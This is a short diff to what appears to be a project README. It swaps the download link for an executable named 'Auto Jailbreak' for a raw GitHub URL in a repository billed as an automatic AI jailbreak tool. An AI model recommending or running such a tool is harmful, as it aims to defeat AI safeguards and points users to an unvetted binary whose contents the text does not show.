@@ -30,5 +30,5 @@ Simple. Fast. Powerful.
 
 Download the latest release here:
 
-[Download Auto Jailbreak](./AutoJailbreak.exe)
+[⬇ Download Auto Jailbreak](https://github.com/blobby12314/Best-Auto-Ai-Jailbreak/raw/main/Auto%20Jailbreak.exe)
 
